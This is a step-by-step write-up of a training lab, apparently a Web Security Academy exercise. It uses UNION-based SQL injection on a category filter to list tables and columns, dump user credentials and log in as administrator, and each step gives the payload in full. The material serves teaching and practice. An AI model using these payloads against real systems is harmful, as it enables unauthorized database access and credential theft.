# Lab: SQL injection attack, listing the database contents on non-Oracle databases

This lab demonstrates how to use SQL injection to enumerate and extract sensitive data such as table names, column names, and user credentials from a non-Oracle database using `UNION SELECT` injection.

---

## 🧪 Step 1: Access the Lab

Navigate to the lab URL and inspect the filter categories.

📸 ![Step 1 - Access the Lab](./6-steps/1-access-lab.png)

---

## 🔍 Step 2: Determine Column Count and Text Columns

Intercept the request to the `/filter` endpoint using Burp Suite, and send it to **Repeater**. Modify the `category` parameter to:

```sql
Gifts' UNION SELECT 'abc','def'-- 
```

📸 ![Step 2 - Column Test](./6-steps/2-column-test.png)

This confirms that there are two columns and both accept string values.

---

## 🧱 Step 3: Enumerate Table Names

Now try to fetch table names using the following payload:

```sql
Gifts' UNION SELECT table_name,NULL FROM information_schema.tables--
```

📸 ![Step 3 - Table Names](./6-steps/3-table-names.png)

From the response, identify the table likely storing credentials, e.g., `users_refclt`.

---

## 🧬 Step 4: Enumerate Column Names

Use the following payload to enumerate columns in the `users_refclt` table:

```sql
Gifts' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_refclt'--
```

📸 ![Step 4 - Column Names](./6-steps/4-column-names.png)

Look for columns like `username_vonhqo` and `password_fshwfp`.

---

## 📥 Step 5: Extract User Credentials

Extract the user credentials using this payload:

```sql
Gifts' UNION SELECT username_vonhqo,password_fshwfp FROM users_refclt--
```

📸 ![Step 5 - Extracted Credentials](./6-steps/5-dumped-credentials.png)

Find the `administrator` user and the corresponding password (e.g., `egby7m3v5p3z3q4vhnfo`).

---

## 🔐 Step 6: Login as Administrator

Visit `/login` and use the extracted credentials:

- **Username:** `administrator`
- **Password:** `egby7m3v5p3z3q4vhnfo`

📸 ![Step 6 - Lab Solved](./6-steps/6-lab-solved.png)

---

✅ **Lab successfully solved!**
